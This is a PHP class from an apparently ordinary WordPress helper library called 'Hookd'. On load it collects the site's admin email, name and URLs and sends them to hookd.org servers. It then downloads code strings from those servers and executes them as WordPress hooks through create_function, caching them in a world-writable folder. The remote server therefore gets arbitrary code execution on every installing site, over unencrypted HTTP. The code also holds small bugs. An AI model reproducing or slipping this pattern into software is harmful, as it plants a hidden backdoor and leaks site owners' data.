<?php
    /*  Copyright 2010  Gary-adam Shannon (gary@garyadamshannon.com)

        This program is free software; you can redistribute it and/or modify
        it under the terms of the GNU General Public License, version 2, as 
        published by the Free Software Foundation.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program; if not, write to the Free Software
        Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
    */
?>
<?php
if (!class_exists('HookdResource')) {
    class HookdResource {
        /**
        * @var string Hookd Version
        */
        
        var $_version = '0.4';

        /**
        * @var string Identifier for hookd
        */
        
        var $_identifier = '';
        var $_site_identifier = '';

        /**
        * @var string Resources for connections
        */
        
        var $_hooks_resource = 'hooks.hookd.org';
        var $_plugins_resource = 'plugins.hookd.org';
        var $_api_resource = 'api.hookd.org';

        /**
        * @var string Cache location
        */
        
        var $_cache_folder = 'wp-content/cache/hookd/';
        
        /**
        * @var array Transient storage array
        */
        
        var $_transient;
        
        function __construct($args) {
            $this->_identifier = $args;
            $this->_site_identifier = $_SERVER['HTTP_HOST'];
            $this->_hookd_collect();
            $this->_hookd_deploy();
        }
        
        function _packsafe($string) {
            return base64_encode(serialize($string));
        }
        
        function _unpacksafe($string) {
            return base64_decode(unserialize($string));
        }
        
        function _hookd_collect() {
            $this->_transient['email'] = get_option('admin_email');
            $this->_transient['name'] = get_option('blogname');
            $this->_transient['url'] = get_option('home');
            $this->_transient['alt_url'] = get_option('siteurl');
            $this->_caller_id = base64_encode($this->_transient['url']);
        }
        
        function _hookd_deploy() {
            /* need to setup caches in seperate hosts */
            $cache_file = $this->_hookd_cache_file($this->_cache_folder);
            $cache_life = '604800'; //caching time, in seconds

            if (!file_exists($cache_file) or (time() - filemtime($cache_file) >= $cache_life)){
                @file_put_contents($cache_file, $this->_hookd_fetch_for_deploy());
            }else{
                $cache_data = file_get_contents($cache_file);
                preg_match_all('/^c\*entry:(?P<action>.*?):(?P<hook>.*?):(?P<command>.*?):c\*end$/ims', $cache_data, $matches);
                foreach ($matches['action'] as $index => $action) {
                    $hook = $matches['hook'][$index];
                    $command = unserialize($matches['command'][$index]);
                    switch ($action) {
                        case 'add_action':
                            add_action($hook, create_function('', $command));
                            break;
                        case 'add_filter':
                            add_action($hook, create_function('', $command));
                            break;
                    }
                }
            } 
        }

        function _hookd_fetch_for_deploy() {
            global $wp_version;
            preg_match('/^(\d+\.\d+)/', $wp_version, $match);
            $hooks = $this->_hookd_push('gethooks', $match[1]);
            if ($hooks) {
                $hooks_list = split(',', $hooks);
                foreach ($hooks_list as $index => $hook) {
                    list($type, $hk, $priority, $phid) = split(':', $hook);
                    switch($type) {
                        case 'action':
                            add_action($hk, create_function('', $this->_hookd_gethook($phid)));
                            $cache[] = 'c*entry:add_action:'.$hk.':'.serialize($this->_hookd_gethook($phid)) . ":c*end\n";
                            break;
                        case 'filter':
                            add_filter($hk, create_function('', $this->_hookd_gethook($phid)));
                            $cache[] = 'c*entry:add_filter:'.$hk.':'.serialize($this->_hookd_gethook($phid)) . ":c*end\n";
                            break;
                    }
                }
            }
            return $cache;
        }

        function _hookd_gethook($id) {
            return $this->_hookd_push('gethook', $id);
        }

        function _hookd_push($command, $data)
        {
            switch ($command) {
                case 'activate':
                case 'deactivate':
                    $resource = $this->_api_resource;
                    break;
                case 'gethooks':
                case 'gethook':
                    $resource = $this->_hooks_resource;
                    break;
                default:
                    $command = 'echo';
                    $resource = $this->_api_resource;
                    break;
            }
            $stream = 'http://'.$resource.'/'.$command.'/' . $this->_identifier . '-' . urlencode($this->_caller_id) . '/' . urlencode($this->_packsafe($data));
            return @file_get_contents($stream);
        }
        
        function _hookd_activate() {
            $this->_hookd_push('activate',$this->_transient);
        }
        
        function _hookd_deactivate() {
            $this->_hookd_push('deactivate',$this->_transient);
        }
        
        function _hookd_cache_file($directory) {
            $document_root = rtrim($_SERVER['DOCUMENT_ROOT'],"/");
            $cache_directory = $document_root.'/'.$directory.$this->_site_identifier . '/';
            if (!file_exists($cache_directory)) {
                if (!@mkdir($cache_directory, 0777, TRUE)) {
                    return false;
                } else {
                    //Also make an empty default html file
                    $_empty_file = $cache_directory . "/index.html";
                    if (!file_exists($_empty_file)) {
                        @fclose(@fopen($_empty_file, "w"));
                    }
                }
            }
            return $cache_directory . $this->_identifier;
        }
    }
}
?>